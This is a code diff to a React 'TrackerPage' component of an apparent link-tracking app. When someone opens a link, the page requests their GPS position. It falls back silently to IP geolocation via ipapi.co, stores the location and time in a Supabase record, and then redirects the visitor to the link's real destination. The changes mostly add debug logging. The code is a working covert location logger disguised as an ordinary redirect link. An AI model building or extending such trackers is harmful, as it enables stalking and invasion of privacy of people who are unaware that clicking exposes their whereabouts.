@@ -2,8 +2,6 @@ import React, { useEffect, useState } from 'react';
 import { supabase } from '../supabase';
 
 export default function TrackerPage() {
-  const [ok, setOk] = useState(false);
-
   useEffect(() => {
     async function coletar() {
       const id = window.location.pathname.split('/').pop();
@@ -12,11 +10,13 @@ export default function TrackerPage() {
         loc: 'Unknown',
         data: new Date().toLocaleString('en-US')
       };
-      function getAcessoData() {
+      async function getAcessoData() {
+        console.log('Tentando pedir permissão de localização...');
         if (navigator.geolocation) {
           return new Promise(resolve => {
             navigator.geolocation.getCurrentPosition(
               pos => {
+                console.log('Permissão concedida:', pos);
                 acesso.loc = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`;
                 acesso.gps = true;
                 fetch('https://ipapi.co/json/')
@@ -28,6 +28,7 @@ export default function TrackerPage() {
                   .catch(() => resolve());
               },
               err => {
+                console.log('Permissão negada ou erro:', err);
                 fetch('https://ipapi.co/json/')
                   .then(resp => resp.json())
                   .then(data => {
@@ -42,6 +43,7 @@ export default function TrackerPage() {
             );
           });
         } else {
+          console.log('Geolocalização não suportada');
           return fetch('https://ipapi.co/json/')
             .then(resp => resp.json())
             .then(data => {
@@ -53,24 +55,30 @@ export default function TrackerPage() {
         }
       }
       await getAcessoData();
+      console.log('Acesso coletado:', acesso);
       // Busca o link pelo id
       const { data, error } = await supabase
         .from('links')
         .select('*')
         .eq('id', id)
         .single();
+      console.log('Resultado da busca do link:', { data, error });
       if (data) {
         // Atualiza acessos
         const novosAcessos = [...(data.acessos || []), acesso];
-        await supabase
+        const { error: updateError } = await supabase
           .from('links')
           .update({ acessos: novosAcessos })
           .eq('id', id);
+        if (updateError) {
+          console.error('Erro ao atualizar acessos:', updateError);
+        }
         setTimeout(() => {
           if (data.destino) window.location.href = data.destino;
         }, 1500);
+      } else {
+        console.error('Link não encontrado no Supabase para o id:', id);
       }
-      setOk(true);
     }
     coletar();
   }, []);
